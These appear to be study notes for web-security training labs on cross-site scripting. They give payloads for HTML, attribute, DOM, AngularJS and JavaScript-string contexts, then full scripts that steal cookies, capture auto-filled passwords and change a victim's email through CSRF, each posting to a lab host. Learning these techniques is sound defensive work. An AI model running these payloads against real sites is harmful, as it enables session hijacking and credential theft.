# Cross-site scripting (contexts)

## XSS between HTML tags

### Reflected XSS into HTML context with nothing encoded
Search for: `<script>alert(1)</script>`

### Stored XSS into HTML context with nothing encoded
Post new comment: `<script>alert(1)</script>`

## XSS in HTML tag attributes

### Reflected XSS into attribute with angle brackets HTML-encoded
Context:
```html
<input maxlength="600" type="text" placeholder="Search the blog..." name="search" value="{HERE}">
```
Exploit:
```
" onfocus=alert(1) autofocus foo="
```
Result:
```html
<input name="search" value="" onfocus=alert(1) autofocus foo="">
```

### Stored XSS into anchor href attribute with double quotes HTML-encoded
Context:
```html
<a id="author" href="{HERE}">My web</a>
```
Exploit:
```
javascript:alert(1)
```

## DOM-based XSS

### DOM XSS in document.write sink using source location.search
Context:
```js
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```
Exploit:
```
" onload="alert(1)"
```
Result:
```html
<img src="/resources/images/tracker.gif?searchTerms="" onload="alert(1)">
```

### DOM XSS in document.write sink using source location.search inside a select element
Context:
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
...
document.write('</select>');
```
Exploit:
```
storeId=</option></select><script>alert(1)</script>
```
Result:
```html
<select name="storeId">
    <option selected></option>
</select>
<script>alert(1)</script>

</option>
</select>
```

### DOM XSS in innerHTML sink using source location.search
Context:
```html
<h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```
Exploit:
```
<img src=0 onerror="alert(1)">
```
Result:
```html
<span id="searchMessage"><img src=0 onerror="alert(1)"></span>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source
Context:
```js
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
Exploit:
```
returnPath=javascript:alert(1)
```
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Context:
```html
<h1 ng-app="" class="ng-scope">0 search results for '{HERE}'</h1>
```
Exploit:
```
{{$on.constructor('alert(1)')()}}
```
Result:
```html
<h1 ng-app="" class="ng-scope">0 search results for '{{$on.constructor('alert(1)')()}}'</h1>
```

## XSS into JavaScript

### Reflected XSS into a JavaScript string with single quote and backslash escaped
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
</script><script>alert(1)</script>
```
Result:
```js
var searchTerms = '</script>
<script>alert(1)</script>
';
```
*The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks
of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.*

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
';alert(1);//
```
Result:
```js
var searchTerms = '';alert(1);//';
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
\';alert(1);// 
```
Result:
```js
var searchTerms = '\\';alert(1);// ';
```
Trick is that the \ is also escaped!

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Context:
```html
<a id="author" href="http://www.foo.bar" onclick="var tracker={track(){}};tracker.track('{HERE}');">Web</a>
```
Exploit:
```
http://foo.bar&apos;);alert(1);//
```
Result:
```html
<a id="author" href="http://www.foo.bar" onclick="var tracker={track(){}};tracker.track('http://foo.bar');alert(1);//');">Web</a>
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Context:
```js
var message = `0 search results for '{HERE}'`;
```
Exploit:
```
${alert(document.domain)}
```
Result:
```js
var message = `0 search results for '${alert(document.domain)}'`;
```
**Note:** Update the base URL https://ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net/ to match yours!

_Instead of using Burp Collaborator, you could adapt the attack to make the victim post their cookie within
a blog comment by exploiting the XSS to perform CSRF, although this would mean that the cookie value is
exposed publicly, and also discloses evidence that the attack was performed._

## Exploiting cross-site scripting to steal cookies

_Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session
handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your
own domain, then manually inject the cookies into your browser and impersonate the victim._

```html
<script>
window.onload = function(e) {
    var csrf = document.getElementsByName("csrf")[0].value;
    console.log(csrf);
    fetch('https://ac6b1f801e21e609805034f000bf00b3.web-security-academy.net/post/comment', {
        method: 'POST',
        body: 'csrf=' + csrf + '&postId=1&comment=Cookie: ' + document.cookie + '&name=Jan&email=admin%40cmdnctrl.net&website='
    });
};
</script>
```

## Exploiting cross-site scripting to capture passwords

_These days, many users have password managers that auto-fill their passwords. You can take advantage
of this by creating a password input, reading out the auto-filled password, and sending it to your
own domain. This technique avoids most of the problems associated with stealing cookies, and can even
gain access to every other account where the victim has reused the same password._

```html
<form><input type="text" id="username" name="username"></form>
<form><input type="password" id="password" name="password"></form>
<script>
window.onload = function(e) {
    setTimeout(function() {
        var csrf = document.getElementsByName("csrf")[0].value;
        var username = document.getElementById("username").value;
        var passw = document.getElementById("password").value;
        console.log(csrf);
        fetch('https://ac741f481eba7f5d80a83ee7003a00d0.web-security-academy.net/post/comment', {
            method: 'POST',
            body: 'csrf=' + csrf + '&postId=3&comment=Username: ' + username + ', Password: ' + passw + '&name=Jan&email=admin%40cmdnctrl.net&website='
        });
    }, 2500);
};
</script>
```

## Exploiting cross-site scripting to perform CSRF

_Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site
you're targeting, you might be able to make a victim send a message, accept a friend request, commit a
backdoor to a source code repository, or transfer some Bitcoin._

```html
<script>
window.onload = function(e) {
    var csrf = document.getElementsByName("csrf")[0].value;
    console.log(csrf);
    fetch('https://ac8e1fe31e1017ee80982bb700310061.web-security-academy.net/email/change', {
        method: 'POST',
        body: 'csrf=' + csrf + '&email=john@wick.com'
    });
};
</script>
```


